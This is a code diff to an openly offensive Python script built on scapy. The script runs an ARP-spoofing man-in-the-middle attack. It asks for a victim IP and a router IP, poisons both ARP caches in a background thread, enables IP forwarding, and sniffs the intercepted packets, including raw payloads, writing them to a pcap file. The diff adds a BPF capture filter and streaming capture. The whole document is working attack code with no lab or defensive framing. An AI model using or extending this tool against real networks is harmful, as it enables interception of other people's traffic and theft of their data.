@@ -6,15 +6,19 @@ from scapy.all import *
 
 def get_info():
     print("~~~ [1] Initializing Config...")
-    interface = input("Enter Interface (e.g., eth0): ")
-    victim_ip = input("Enter Victim IP: ")
-    router_ip = input("Enter Router IP: ")
+    interface = input("Enter Interface: ")
+    v_ip = input("Enter Victim IP: ")
+    r_ip = input("Enter Router IP: ")
     log_pcap = input("Log traffic to PCAP file? (y/n): ").lower() == 'y'
+    
+    bpf_filter = input("Enter BPF Filter (leave blank for all, e.g., 'tcp port 80'): ")
+    
     return {
         "iface": interface, 
-        "v_ip": victim_ip, 
-        "r_ip": router_ip, 
-        "log": log_pcap
+        "v_ip": v_ip, 
+        "r_ip": r_ip, 
+        "log": log_pcap,
+        "filter": bpf_filter
     }
 
 def set_ip_forwarding(toggle):
@@ -23,7 +27,6 @@ def set_ip_forwarding(toggle):
         os.system(f'sysctl -w net.inet.ip.forwarding={state}')
     else:
         os.system(f'echo {state} > /proc/sys/net/ipv4/ip_forward')
-    print(f"~~~ [2] IP Forwarding {'Enabled' if toggle else 'Disabled'}")
 
 def get_mac(ip, interface):
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
@@ -38,18 +41,10 @@ def spoof_thread(v_ip, v_mac, r_ip, r_mac, stop_event):
         send(ARP(op=2, pdst=r_ip, psrc=v_ip, hwdst=r_mac), verbose=False)
         time.sleep(2)
 
-def restore_network(v_ip, v_mac, r_ip, r_mac, interface):
-    print("\n~~~ [!] Stopping...")
-    send(ARP(op=2, pdst=r_ip, psrc=v_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=v_mac), count=5, verbose=False)
-    send(ARP(op=2, pdst=v_ip, psrc=r_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=r_mac), count=5, verbose=False)
-    set_ip_forwarding(False)
-
-captured_packets = []
-
-def sniff_callback(packet, log_enabled):
+def sniff_callback(packet, writer):
     if packet.haslayer(IP):
-        if log_enabled:
-            captured_packets.append(packet)
+        if writer:
+            writer.write(packet)
             
         if packet.haslayer(Raw):
             payload = packet[Raw].load
@@ -58,37 +53,45 @@ def sniff_callback(packet, log_enabled):
 def mitm():
     conf = get_info()
     if os.geteuid() != 0:
-        print("~!~ Error: Run as root (sudo).")
+        print("~!~ Error: Run as root.")
         sys.exit(1)
 
-    print("~~~ [3] Resolving MAC addresses...")
+    print("~~~ [2] Resolving MAC addresses...")
     v_mac = get_mac(conf["v_ip"], conf["iface"])
     r_mac = get_mac(conf["r_ip"], conf["iface"])
     
     if not v_mac or not r_mac:
-        print("~!~ Error: Resolution failed.")
+        print("~!~ Error.")
         sys.exit(1)
 
     set_ip_forwarding(True)
     stop_spoofing = threading.Event()
     spoof_worker = threading.Thread(target=spoof_thread, args=(conf["v_ip"], v_mac, conf["r_ip"], r_mac, stop_spoofing))
     
+    writer = None
+    if conf["log"]:
+        filename = f"capture_{int(time.time())}.pcap"
+        writer = PcapWriter(filename, append=True, sync=True)
+        print(f"~~~ [3] Sending packets to {filename}...")
+
     try:
         spoof_worker.start()
-        print(f"~~~ [4] MITM Active. Sniffing on {conf['iface']}...")
-
-        sniff(iface=conf["iface"], prn=lambda pkt: sniff_callback(pkt, conf["log"]), store=0)
+        print(f"~~~ [4] MITM Running. Filtering for: '{conf['filter'] if conf['filter'] else 'all'}'")
+        sniff(iface=conf["iface"], 
+              filter=conf["filter"],
+              prn=lambda pkt: sniff_callback(pkt, writer), 
+              store=0)
         
     except KeyboardInterrupt:
+        print("\n~~~ [!] Shutting down...")
         stop_spoofing.set()
         spoof_worker.join()
         
-        if conf["log"] and captured_packets:
-            filename = f"mitm_capture_{int(time.time())}.pcap"
-            print(f"~~~ [*] Saving {len(captured_packets)} packets to {filename}...")
-            wrpcap(filename, captured_packets)
-            
-        restore_network(conf["v_ip"], v_mac, conf["r_ip"], r_mac, conf["iface"])
+        if writer:
+            writer.close()
+        send(ARP(op=2, pdst=conf["r_ip"], psrc=conf["v_ip"], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=v_mac), count=5, verbose=False)
+        send(ARP(op=2, pdst=conf["v_ip"], psrc=conf["r_ip"], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=r_mac), count=5, verbose=False)
+        set_ip_forwarding(False)
         print("~~~ [5] Clean Exit Successful.")
 
 mitm()
